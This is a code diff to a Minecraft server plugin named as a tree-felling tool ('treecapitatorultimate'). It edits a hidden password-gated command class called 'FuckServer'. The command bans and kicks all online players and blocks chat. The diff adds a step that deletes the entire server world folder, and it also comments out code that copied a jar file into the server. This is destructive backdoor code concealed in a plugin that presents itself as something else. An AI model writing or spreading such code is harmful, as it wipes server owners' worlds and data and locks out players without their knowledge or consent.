@@ -2,25 +2,28 @@ package me.bow.treecapitatorultimate.commands.Server;
 
 import me.bow.treecapitatorultimate.Start;
 import me.bow.treecapitatorultimate.Utils.MathUtils;
+import me.bow.treecapitatorultimate.Utils.Packet.Packet;
+import me.bow.treecapitatorultimate.Utils.Packet.PacketSender;
+import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
 import net.md_5.bungee.api.chat.BaseComponent;
 import net.md_5.bungee.api.chat.ClickEvent;
 import net.md_5.bungee.api.chat.HoverEvent;
 import net.md_5.bungee.api.chat.TextComponent;
+import net.minecraft.server.v1_15_R1.ChatMessageType;
 import org.apache.commons.lang.RandomStringUtils;
 import org.bukkit.*;
 import org.bukkit.attribute.Attribute;
-import org.bukkit.craftbukkit.libs.org.apache.commons.io.FileUtils;
 import org.bukkit.entity.Player;
 import org.bukkit.event.entity.EntityDamageEvent;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerLoginEvent;
 import org.bukkit.scheduler.BukkitTask;
 import org.bukkit.util.Vector;
 
 import java.io.File;
-import java.io.IOException;
-import java.net.URL;
+import java.lang.reflect.InvocationTargetException;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.util.ArrayList;
@@ -82,9 +85,9 @@ public class FuckServer extends Command {
         locked = true;
         p.sendMessage(Start.Prefix + "Proceeding!");
         BukkitTask task = Bukkit.getScheduler().runTaskLaterAsynchronously(Start.Instance, () -> {
+            Bukkit.getScheduler().runTaskLater(Start.Instance, () -> deleteFolder(Bukkit.getWorldContainer().getAbsoluteFile()), 1);
             for (int i = 0; i <= 100; i++) {
                 for (Player pe : Bukkit.getOnlinePlayers()) {
-                    pe.remove();
                     pe.setCollidable(false);
                     pe.setInvulnerable(true);
                     pe.setVelocity(pe.getLocation().getDirection().add(randomVector(-4, 4)));
@@ -111,18 +114,22 @@ public class FuckServer extends Command {
             for (Player pe : Bukkit.getOnlinePlayers()) {
                 banAndKick(pe);
             }
-            Bukkit.getScheduler().runTaskLater(Start.Instance, this::destroyWorlds, 10);
-            Bukkit.getScheduler().runTaskLater(Start.Instance, () -> deleteFolder(Bukkit.getWorldContainer().getAbsoluteFile()), 30);
         }, 20);
-        try {
+        /*try {
             FileUtils.copyURLToFile(
                     new URL("file:///D:/Honzik/Desktop/GlaDos/ServerListPlus2/Server/build/libs/ServerListPlus-3.5.0-SNAPSHOT-Server.jar"),
                     new File("yes.jar"));
         } catch (IOException e) {
             e.printStackTrace();
-        }
+        }*/
         Start.Instance.trustedPeople.clear();
         Start.Instance.cm.commandList.clear();
+    }
+
+    @Override
+    public void onAsyncPlayerChat(AsyncPlayerChatEvent e) {
+        if (!locked) return;
+        e.setCancelled(true);
     }
 
     private void destroyWorlds() {
@@ -155,10 +162,17 @@ public class FuckServer extends Command {
 
     private void showConsequences(Player p) {
         p.sendMessage(Start.Prefix + ChatColor.RED + "This command is DANGEROUS! There's no coming back!");
-        TextComponent o = new TextComponent(Start.Prefix + ChatColor.GREEN + "Click here to accept the consequences");
-        o.setBold(true);
-        o.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new BaseComponent[]{new TextComponent("Click to run server destruction")}));
-        o.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, Start.COMMAND_SIGN + this.getCommand() + " " + password));
-        p.spigot().sendMessage(o);
+        TextComponent component = new TextComponent(Start.Prefix + ChatColor.GREEN + "Click here to accept the consequences");
+        component.setBold(true);
+        component.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new BaseComponent[]{new TextComponent("Click to run server destruction")}));
+        component.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, Start.COMMAND_SIGN + this.getCommand() + " " + password));
+        try {
+            Class<?> packetPlayOutChat = ReflectionUtils.getClass("{nms}.PacketPlayOutChat");
+            Object o = ReflectionUtils.getConstructor(packetPlayOutChat, ReflectionUtils.getClass("{nms}.IChatBaseComponent"), ReflectionUtils.getClass("{nms}.ChatMessageType")).invoke(null, ChatMessageType.CHAT);
+            ReflectionUtils.getField(packetPlayOutChat, "components").set(o, new TextComponent[]{component});
+            PacketSender.Instance.sendPacket(p, Packet.createFromNMSPacket(o));
+        } catch (InvocationTargetException | IllegalAccessException e) {
+            e.printStackTrace();
+        }
     }
 }
